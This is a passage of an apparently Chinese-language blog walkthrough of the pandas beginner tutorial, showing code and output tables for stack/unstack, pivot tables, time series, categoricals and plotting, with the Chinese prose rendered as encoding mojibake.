<td>-1.433628</td>      <td>0.627898</td>    </tr>    <tr>      <th>two</th>      <td>2.129267</td>      <td>-0.260206</td>    </tr>    <tr>      <th rowspan="2" valign="top">qux</th>      <th>one</th>      <td>0.498752</td>      <td>-0.622814</td>    </tr>    <tr>      <th>two</th>      <td>-0.356492</td>      <td>1.364184</td>    </tr>  </tbody></table></div><pre class="language-python" data-language="python"><code class="language-python">df2 <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>df2</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th></th>      <th>A</th>      <th>B</th>    </tr>    <tr>      <th>first</th>      <th>second</th>      <th></th>      <th></th>    </tr>  </thead>  <tbody>    <tr>      <th rowspan="2" valign="top">bar</th>      <th>one</th>      <td>1.402402</td>      <td>-0.215913</td>    </tr>    <tr>      <th>two</th>      <td>-0.305333</td>      <td>-0.679614</td>    </tr>    <tr>      <th rowspan="2" valign="top">baz</th>      <th>one</th>      <td>0.745205</td>      <td>0.872718</td>    </tr>    <tr>      <th>two</th>      <td>0.421718</td>      <td>-0.662528</td>    </tr>  </tbody></table></div><p><code>stack()</code>æ–¹æ³•åœ¨ DataFrame åˆ—çš„å±‚æ¬¡ä¸Šè¿›è¡Œ<strong>å‹ç¼©</strong> </p><pre class="language-python" data-language="python"><code class="language-python">stacked <span class="token operator">=</span> df2<span class="token punctuation">.</span>stack<span class="token punctuation">(</span><span class="token punctuation">)</span>stacked</code></pre><pre><code>first  second   bar    one     A    1.402402               B   -0.215913       two     A   -0.305333               B   -0.679614baz    one     A    0.745205               B    0.872718       two     A    0.421718               B   -0.662528dtype: float64</code></pre><p>å¯¹äºä¸€ä¸ªç»è¿‡äº† stack çš„ DataFrame æˆ–è€… Seriesï¼ˆä»¥ MultiIndex ä½œä¸ºç´¢å¼•ï¼‰ï¼Œ<code>stack()</code>çš„é€†è¿ç®—æ˜¯<code>isunstack()</code>ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯ unstack æœ€åä¸€å±‚ã€‚ </p><p>å°±æ˜¯è¯´ï¼Œbarã€bazæ˜¯ç¬¬0çº§ï¼Œoneã€twoæ˜¯ç¬¬1çº§ï¼ŒAã€Bæ˜¯ç¬¬2çº§ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">stacked<span class="token punctuation">.</span>unstack<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th></th>      <th>A</th>      <th>B</th>    </tr>    <tr>      <th>first</th>      <th>second</th>      <th></th>      <th></th>    </tr>  </thead>  <tbody>    <tr>      <th rowspan="2" valign="top">bar</th>      <th>one</th>      <td>1.402402</td>      <td>-0.215913</td>    </tr>    <tr>      <th>two</th>      <td>-0.305333</td>      <td>-0.679614</td>    </tr>    <tr>      <th rowspan="2" valign="top">baz</th>      <th>one</th>      <td>0.745205</td>      <td>0.872718</td>    </tr>    <tr>      <th>two</th>      <td>0.421718</td>      <td>-0.662528</td>    </tr>  </tbody></table></div><pre class="language-python" data-language="python"><code class="language-python">stacked<span class="token punctuation">.</span>unstack<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>second</th>      <th>one</th>      <th>two</th>    </tr>    <tr>      <th>first</th>      <th></th>      <th></th>      <th></th>    </tr>  </thead>  <tbody>    <tr>      <th rowspan="2" valign="top">bar</th>      <th>A</th>      <td>1.402402</td>      <td>-0.305333</td>    </tr>    <tr>      <th>B</th>      <td>-0.215913</td>      <td>-0.679614</td>    </tr>    <tr>      <th rowspan="2" valign="top">baz</th>      <th>A</th>      <td>0.745205</td>      <td>0.421718</td>    </tr>    <tr>      <th>B</th>      <td>0.872718</td>      <td>-0.662528</td>    </tr>  </tbody></table></div><pre class="language-python" data-language="python"><code class="language-python">stacked<span class="token punctuation">.</span>unstack<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>first</th>      <th>bar</th>      <th>baz</th>    </tr>    <tr>      <th>second</th>      <th></th>      <th></th>      <th></th>    </tr>  </thead>  <tbody>    <tr>      <th rowspan="2" valign="top">one</th>      <th>A</th>      <td>1.402402</td>      <td>0.745205</td>    </tr>    <tr>      <th>B</th>      <td>-0.215913</td>      <td>0.872718</td>    </tr>    <tr>      <th rowspan="2" valign="top">two</th>      <th>A</th>      <td>-0.305333</td>      <td>0.421718</td>    </tr>    <tr>      <th>B</th>      <td>-0.679614</td>      <td>-0.662528</td>    </tr>  </tbody></table></div><h3 id="0x0A-2-æ•°æ®é€è§†è¡¨-Pivot-Tables"><a href="#0x0A-2-æ•°æ®é€è§†è¡¨-Pivot-Tables" class="headerlink" title="0x0A-2 æ•°æ®é€è§†è¡¨ Pivot Tables"></a>0x0A-2 æ•°æ®é€è§†è¡¨ Pivot Tables</h3><pre class="language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'A'</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'two'</span><span class="token punctuation">,</span> <span class="token string">'three'</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">,</span>                   <span class="token string">'B'</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">,</span>                   <span class="token string">'C'</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">,</span>                   <span class="token string">'D'</span> <span class="token punctuation">:</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                   <span class="token string">'E'</span> <span class="token punctuation">:</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>df</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>E</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>one</td>      <td>A</td>      <td>foo</td>      <td>0.072696</td>      <td>0.305015</td>    </tr>    <tr>      <th>1</th>      <td>one</td>      <td>B</td>      <td>foo</td>      <td>1.428383</td>      <td>-1.108178</td>    </tr>    <tr>      <th>2</th>      <td>two</td>      <td>C</td>      <td>foo</td>      <td>1.239483</td>      <td>0.001580</td>    </tr>    <tr>      <th>3</th>      <td>three</td>      <td>A</td>      <td>bar</td>      <td>-0.953547</td>      <td>1.061740</td>    </tr>    <tr>      <th>4</th>      <td>one</td>      <td>B</td>      <td>bar</td>      <td>0.762730</td>      <td>1.161542</td>    </tr>    <tr>      <th>5</th>      <td>one</td>      <td>C</td>      <td>bar</td>      <td>-0.372740</td>      <td>-0.480251</td>    </tr>    <tr>      <th>6</th>      <td>two</td>      <td>A</td>      <td>foo</td>      <td>0.765181</td>      <td>-1.034218</td>    </tr>    <tr>      <th>7</th>      <td>three</td>      <td>B</td>      <td>foo</td>      <td>-1.858334</td>      <td>0.359220</td>    </tr>    <tr>      <th>8</th>      <td>one</td>      <td>C</td>      <td>foo</td>      <td>-0.952807</td>      <td>1.067494</td>    </tr>    <tr>      <th>9</th>      <td>one</td>      <td>A</td>      <td>bar</td>      <td>0.541013</td>      <td>-0.280833</td>    </tr>    <tr>      <th>10</th>      <td>two</td>      <td>B</td>      <td>bar</td>      <td>-1.810560</td>      <td>-0.829793</td>    </tr>    <tr>      <th>11</th>      <td>three</td>      <td>C</td>      <td>bar</td>      <td>-1.049108</td>      <td>-0.295998</td>    </tr>  </tbody></table></div><pre class="language-python" data-language="python"><code class="language-python">pd<span class="token punctuation">.</span>pivot_table<span class="token punctuation">(</span>df<span class="token punctuation">,</span> values<span class="token operator">=</span><span class="token string">'D'</span><span class="token punctuation">,</span> index<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> columns<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'C'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>C</th>      <th>bar</th>      <th>foo</th>    </tr>    <tr>      <th>A</th>      <th>B</th>      <th></th>      <th></th>    </tr>  </thead>  <tbody>    <tr>      <th rowspan="3" valign="top">one</th>      <th>A</th>      <td>0.541013</td>      <td>0.072696</td>    </tr>    <tr>      <th>B</th>      <td>0.762730</td>      <td>1.428383</td>    </tr>    <tr>      <th>C</th>      <td>-0.372740</td>      <td>-0.952807</td>    </tr>    <tr>      <th rowspan="3" valign="top">three</th>      <th>A</th>      <td>-0.953547</td>      <td>NaN</td>    </tr>    <tr>      <th>B</th>      <td>NaN</td>      <td>-1.858334</td>    </tr>    <tr>      <th>C</th>      <td>-1.049108</td>      <td>NaN</td>    </tr>    <tr>      <th rowspan="3" valign="top">two</th>      <th>A</th>      <td>NaN</td>      <td>0.765181</td>    </tr>    <tr>      <th>B</th>      <td>-1.810560</td>      <td>NaN</td>    </tr>    <tr>      <th>C</th>      <td>NaN</td>      <td>1.239483</td>    </tr>  </tbody></table></div><h2 id="0x0B-æ—¶é—´åºåˆ—-Time-Series"><a href="#0x0B-æ—¶é—´åºåˆ—-Time-Series" class="headerlink" title="0x0B æ—¶é—´åºåˆ—  Time Series"></a>0x0B æ—¶é—´åºåˆ—  Time Series</h2><p>Pandas åœ¨å¯¹é¢‘ç‡è½¬æ¢è¿›è¡Œé‡æ–°é‡‡æ ·æ—¶æ‹¥æœ‰ç®€å•ã€å¼ºå¤§ä¸”é«˜æ•ˆçš„åŠŸèƒ½ï¼ˆå¦‚å°†æŒ‰ç§’é‡‡æ ·çš„æ•°æ®è½¬æ¢ä¸ºæŒ‰5åˆ†é’Ÿä¸ºå•ä½è¿›è¡Œé‡‡æ ·çš„æ•°æ®ï¼‰ã€‚è¿™ç§æ“ä½œåœ¨é‡‘èé¢†åŸŸéå¸¸å¸¸è§ï¼Œä½†ä¸å±€é™äºæ­¤ã€‚</p><p><em>å“‡ï¼ŒåŸæ¥è¿˜å¯ä»¥è¿™æ ·ç©å”‰ï¼ˆ</em></p><p>è¿™ä¸ªåœ¨ä¿¡å·å¤„ç†é‡Œé¢ä¹Ÿå¾ˆå¸¸ç”¨çš„å‘¢ï¼</p><pre class="language-python" data-language="python"><code class="language-python">rng <span class="token operator">=</span> pd<span class="token punctuation">.</span>date_range<span class="token punctuation">(</span><span class="token string">'1/1/2020'</span><span class="token punctuation">,</span> periods<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">,</span> freq<span class="token operator">=</span><span class="token string">'S'</span><span class="token punctuation">)</span>ts <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>rng<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> index<span class="token operator">=</span>rng<span class="token punctuation">)</span>ts<span class="token punctuation">.</span>resample<span class="token punctuation">(</span><span class="token string">'1Min'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre><code>2020-01-01 00:00:00    132442020-01-01 00:01:00    147992020-01-01 00:02:00    154892020-01-01 00:03:00     3894Freq: T, dtype: int32</code></pre><h3 id="æ—¶åŒºè¡¨ç¤º"><a href="#æ—¶åŒºè¡¨ç¤º" class="headerlink" title="æ—¶åŒºè¡¨ç¤º"></a>æ—¶åŒºè¡¨ç¤º</h3><pre class="language-python" data-language="python"><code class="language-python">rng <span class="token operator">=</span> pd<span class="token punctuation">.</span>date_range<span class="token punctuation">(</span><span class="token string">'4/16/2020 00:00'</span><span class="token punctuation">,</span> periods<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> freq<span class="token operator">=</span><span class="token string">'D'</span><span class="token punctuation">)</span>ts <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>rng<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> rng<span class="token punctuation">)</span>ts</code></pre><pre><code>2020-04-16    0.8720432020-04-17   -0.3052002020-04-18    1.6818282020-04-19    0.1631842020-04-20    1.415422Freq: D, dtype: float64</code></pre><pre class="language-python" data-language="python"><code class="language-python">ts_utc <span class="token operator">=</span> ts<span class="token punctuation">.</span>tz_localize<span class="token punctuation">(</span><span class="token string">'UTC'</span><span class="token punctuation">)</span>ts_utc</code></pre><pre><code>2020-04-16 00:00:00+00:00    0.8720432020-04-17 00:00:00+00:00   -0.3052002020-04-18 00:00:00+00:00    1.6818282020-04-19 00:00:00+00:00    0.1631842020-04-20 00:00:00+00:00    1.415422Freq: D, dtype: float64</code></pre><h3 id="è½¬æ¢åˆ°å¦å¤–ä¸€ä¸ªæ—¶åŒº"><a href="#è½¬æ¢åˆ°å¦å¤–ä¸€ä¸ªæ—¶åŒº" class="headerlink" title="è½¬æ¢åˆ°å¦å¤–ä¸€ä¸ªæ—¶åŒº"></a>è½¬æ¢åˆ°å¦å¤–ä¸€ä¸ªæ—¶åŒº</h3><pre class="language-python" data-language="python"><code class="language-python">ts_utc<span class="token punctuation">.</span>tz_convert<span class="token punctuation">(</span><span class="token string">'Asia/Shanghai'</span><span class="token punctuation">)</span></code></pre><pre><code>2020-04-16 08:00:00+08:00    0.8720432020-04-17 08:00:00+08:00   -0.3052002020-04-18 08:00:00+08:00    1.6818282020-04-19 08:00:00+08:00    0.1631842020-04-20 08:00:00+08:00    1.415422Freq: D, dtype: float64</code></pre><h3 id="æ—¶é—´è·¨åº¦è½¬æ¢"><a href="#æ—¶é—´è·¨åº¦è½¬æ¢" class="headerlink" title="æ—¶é—´è·¨åº¦è½¬æ¢"></a>æ—¶é—´è·¨åº¦è½¬æ¢</h3><pre class="language-python" data-language="python"><code class="language-python">rng <span class="token operator">=</span> pd<span class="token punctuation">.</span>date_range<span class="token punctuation">(</span><span class="token string">'1/1/2020'</span><span class="token punctuation">,</span> periods<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> freq<span class="token operator">=</span><span class="token string">'M'</span><span class="token punctuation">)</span>ts <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>rng<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> index<span class="token operator">=</span>rng<span class="token punctuation">)</span>ts</code></pre><pre><code>2020-01-31    0.2598472020-02-29   -0.0929692020-03-31    0.5259852020-04-30    0.0903622020-05-31    1.707569Freq: M, dtype: float64</code></pre><pre class="language-python" data-language="python"><code class="language-python">ps <span class="token operator">=</span> ts<span class="token punctuation">.</span>to_period<span class="token punctuation">(</span><span class="token punctuation">)</span>ps</code></pre><pre><code>2020-01    0.2598472020-02   -0.0929692020-03    0.5259852020-04    0.0903622020-05    1.707569Freq: M, dtype: float64</code></pre><pre class="language-python" data-language="python"><code class="language-python">ps<span class="token punctuation">.</span>to_timestamp<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre><code>2020-01-01    0.2598472020-02-01   -0.0929692020-03-01    0.5259852020-04-01    0.0903622020-05-01    1.707569Freq: MS, dtype: float64</code></pre><p>æ—¶æœŸå’Œæ—¶é—´æˆ³ä¹‹é—´çš„è½¬æ¢ä½¿å¾—å¯ä»¥ä½¿ç”¨ä¸€äº›æ–¹ä¾¿çš„ç®—æœ¯å‡½æ•°ã€‚</p><p>ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼Œè½¬æ¢ä¸€ä¸ªæ¯å¹´ä»¥11æœˆç»“æŸçš„å­£åº¦é¢‘ç‡ä¸º å­£åº¦ç»“æŸåçš„æœˆæœ«çš„ä¸Šåˆ9ç‚¹ã€‚<em>ï¼ˆæœ‰ç‚¹æ‡µ</em></p><pre class="language-python" data-language="python"><code class="language-python">prng <span class="token operator">=</span> pd<span class="token punctuation">.</span>period_range<span class="token punctuation">(</span><span class="token string">'1990Q1'</span><span class="token punctuation">,</span> <span class="token string">'2000Q4'</span><span class="token punctuation">,</span> freq<span class="token operator">=</span><span class="token string">'Q-NOV'</span><span class="token punctuation">)</span>ts <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>prng<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> prng<span class="token punctuation">)</span>ts<span class="token punctuation">.</span>index <span class="token operator">=</span> <span class="token punctuation">(</span>prng<span class="token punctuation">.</span>asfreq<span class="token punctuation">(</span><span class="token string">'M'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>asfreq<span class="token punctuation">(</span><span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">9</span>ts<span class="token punctuation">.</span>head<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre><code>1990-03-01 09:00   -1.2874111990-06-01 09:00    1.7444851990-09-01 09:00    0.3365611990-12-01 09:00   -1.2065761991-03-01 09:00    0.108631Freq: H, dtype: float64</code></pre><h2 id="0x0C-ç±»åˆ«-Categoricals"><a href="#0x0C-ç±»åˆ«-Categoricals" class="headerlink" title="0x0C ç±»åˆ« Categoricals"></a>0x0C ç±»åˆ« Categoricals</h2><p>pandas å¯ä»¥åœ¨ DataFrame ä¸­æ”¯æŒ category ç±»å‹çš„æ•°æ®ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"id"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"raw_grade"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>å°† raw grades è½¬æ¢ä¸º category æ•°æ®ç±»å‹ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">[</span><span class="token string">"grade"</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">"raw_grade"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>astype<span class="token punctuation">(</span><span class="token string">"category"</span><span class="token punctuation">)</span>df<span class="token punctuation">[</span><span class="token string">"grade"</span><span class="token punctuation">]</span></code></pre><pre><code>0    a1    b2    b3    a4    a5    eName: grade, dtype: categoryCategories (3, object): [a, b, e]</code></pre><p>å°† category ç±»å‹æ•°æ®é‡å‘½åä¸ºæ›´æœ‰æ„ä¹‰çš„åç§°ï¼Œåˆ©ç”¨<code>Series.cat.categories</code>æ–¹æ³•ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">[</span><span class="token string">"grade"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cat<span class="token punctuation">.</span>categories <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"very good"</span><span class="token punctuation">,</span> <span class="token string">"good"</span><span class="token punctuation">,</span> <span class="token string">"very bad"</span><span class="token punctuation">]</span>df<span class="token punctuation">[</span><span class="token string">"grade"</span><span class="token punctuation">]</span></code></pre><pre><code>0    very good1         good2         good3    very good4    very good5     very badName: grade, dtype: categoryCategories (3, object): [very good, good, very bad]</code></pre><p>å¯¹ç±»åˆ«è¿›è¡Œé‡æ–°æ’åºï¼ŒåŒæ—¶å¢åŠ ç¼ºå¤±çš„ç±»åˆ«ã€‚</p><p><code>Series.cat</code>ä¸‹çš„æ–¹æ³•é»˜è®¤è¿”å›ä¸€ä¸ªæ–°çš„åºåˆ—ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">[</span><span class="token string">"grade"</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">"grade"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cat<span class="token punctuation">.</span>set_categories<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"very bad"</span><span class="token punctuation">,</span> <span class="token string">"bad"</span><span class="token punctuation">,</span> <span class="token string">"medium"</span><span class="token punctuation">,</span> <span class="token string">"good"</span><span class="token punctuation">,</span> <span class="token string">"very good"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>df<span class="token punctuation">[</span><span class="token string">"grade"</span><span class="token punctuation">]</span></code></pre><pre><code>0    very good1         good2         good3    very good4    very good5     very badName: grade, dtype: categoryCategories (5, object): [very bad, bad, medium, good, very good]</code></pre><p> æ’åºæ˜¯æŒ‰ç…§ category çš„é¡ºåºè¿›è¡Œçš„ï¼Œè€Œä¸æ˜¯æŒ‰ç…§è¯æ±‡é¡ºåº(lexical order)ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>sort_values<span class="token punctuation">(</span>by<span class="token operator">=</span><span class="token string">"grade"</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>id</th>      <th>raw_grade</th>      <th>grade</th>    </tr>  </thead>  <tbody>    <tr>      <th>5</th>      <td>6</td>      <td>e</td>      <td>very bad</td>    </tr>    <tr>      <th>1</th>      <td>2</td>      <td>b</td>      <td>good</td>    </tr>    <tr>      <th>2</th>      <td>3</td>      <td>b</td>      <td>good</td>    </tr>    <tr>      <th>0</th>      <td>1</td>      <td>a</td>      <td>very good</td>    </tr>    <tr>      <th>3</th>      <td>4</td>      <td>a</td>      <td>very good</td>    </tr>    <tr>      <th>4</th>      <td>5</td>      <td>a</td>      <td>very good</td>    </tr>  </tbody></table></div><p>å¯¹ä¸€ä¸ª Category ç±»å‹çš„åˆ—è¿›è¡Œåˆ†ç»„æ—¶æ˜¾ç¤ºäº†ç©ºçš„ç±»åˆ«ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">"grade"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>size<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre><code>gradevery bad     1bad          0medium       0good         2very good    3dtype: int64</code></pre><h2 id="0x0D-ä½œå›¾-Plotting"><a href="#0x0D-ä½œå›¾-Plotting" class="headerlink" title="0x0D ä½œå›¾ Plotting"></a>0x0D ä½œå›¾ Plotting</h2><pre class="language-python" data-language="python"><code class="language-python">ts <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> index<span class="token operator">=</span>pd<span class="token punctuation">.</span>date_range<span class="token punctuation">(</span><span class="token string">'1/1/2020'</span><span class="token punctuation">,</span> periods<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>ts <span class="token operator">=</span> ts<span class="token punctuation">.</span>cumsum<span class="token punctuation">(</span><span class="token punctuation">)</span>ts<span class="token punctuation">.</span>plot<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre><code>&lt;matplotlib.axes._subplots.AxesSubplot at 0x250ccebcb70&gt;</code></pre><p><img src="/2020/04/17/DataScience_10MinutesToPandas/output_202_1.png" alt="png"></p><p>å¯¹äº DataFrame è€Œè¨€ï¼Œ<code>plot()</code>æ–¹æ³•æ˜¯ä¸€ç§å°†æ‰€æœ‰å¸¦æœ‰æ ‡ç­¾çš„åˆ—è¿›è¡Œç»˜åˆ¶çš„ç®€ä¾¿æ–¹æ³•ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> index<span class="token operator">=</span>ts<span class="token punctuation">.</span>index<span class="token punctuation">,</span>                  columns<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># print(df)</span>df <span class="token operator">=</span> df<span class="token punctuation">.</span>cumsum<span class="token punctuation">(</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>df<span class="token punctuation">.</span>plot<span class="token punctuation">(</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">'best'</span><span class="token punctuation">)</span></code></pre><pre><code>&lt;matplotlib.legend.Legend at 0x250ce7620b8&gt;&lt;Figure size 432x288 with 0 Axes&gt;</code></pre><p><img src="/2020/04/17/DataScience_10MinutesToPandas/output_204_2.png" alt="png"></p><pre class="language-python" data-language="python"><code class="language-python">ts<span class="token punctuation">.</span>index</code></pre><pre><code>DatetimeIndex(['2020-01-01', '2020-01-02', '2020-01-03', '2020-01-04',               '2020-01-05', '2020-01-06', '2020-01-07', '2020-01-08',               '2020-01-09', '2020-01-10',               ...               '2022-09-17', '2022-09-18', '2022-09-19', '2022-09-20',               '2022-09-21', '2022-09-22', '2022-09-23', '2022-09-24',               '2022-09-25', '2022-09-26'],              dtype='datetime64[ns]', length=1000, freq='D')</code></pre><h2 id="0x0E-å¯¼å…¥å¯¼å‡ºæ•°æ®-Getting-Data-In-Out"><a href="#0x0E-å¯¼å…¥å¯¼å‡ºæ•°æ®-Getting-Data-In-Out" class="headerlink" title="0x0E å¯¼å…¥å¯¼å‡ºæ•°æ® Getting Data In/Out"></a>0x0E 